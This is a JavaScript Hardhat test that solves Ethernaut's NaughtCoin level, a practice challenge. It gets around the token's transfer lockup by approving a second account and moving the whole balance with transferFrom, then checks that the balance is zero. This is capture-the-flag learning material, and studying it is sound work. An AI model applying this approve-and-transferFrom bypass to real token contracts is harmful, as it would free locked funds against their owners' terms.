const { expect } = require("chai");
const { ethers } = require("hardhat");
const { consoleLogTitleH1, consoleLogMessage } = require("./utils.js");

describe("NaughtCoin", function () {
  let deployer;
  let hacker;
  let tester;

  before(async function () {
    consoleLogTitleH1("Level 15 - NaughtCoin");

    consoleLogMessage(`💻 Network: ${hre.network.name}`);

    // 🔨 Addresses
    [deployer, hacker, tester] = await ethers.getSigners();
  });

  it("Should hack NaughtCoin.sol", async function () {
    // 📗 Contract to be hacked
    const contractName = "NaughtCoin";
    const Contract = await ethers.getContractFactory(contractName, deployer);
    const contract = await Contract.connect(deployer).deploy(hacker.address);
    await contract.deployed();

    // 👿 Hacking the contract
    // 🗣 Logging status
    let userBalance = await contract.balanceOf(hacker.address);
    consoleLogMessage(`💰 User balance: ${userBalance} \n`);

    // Approve to another account the movement of tokens
    await contract.connect(hacker).approve(tester.address, userBalance);

    // Move the tokens from hacker to tester
    await contract
      .connect(tester)
      .transferFrom(hacker.address, tester.address, userBalance);

    // 🗣 Logging status
    userBalance = await contract.balanceOf(hacker.address);
    consoleLogMessage(`💰 User balance: ${userBalance} \n`);

    // ✅ Check if the hack was successful
    expect(userBalance).to.be.eq(0);
  });
});
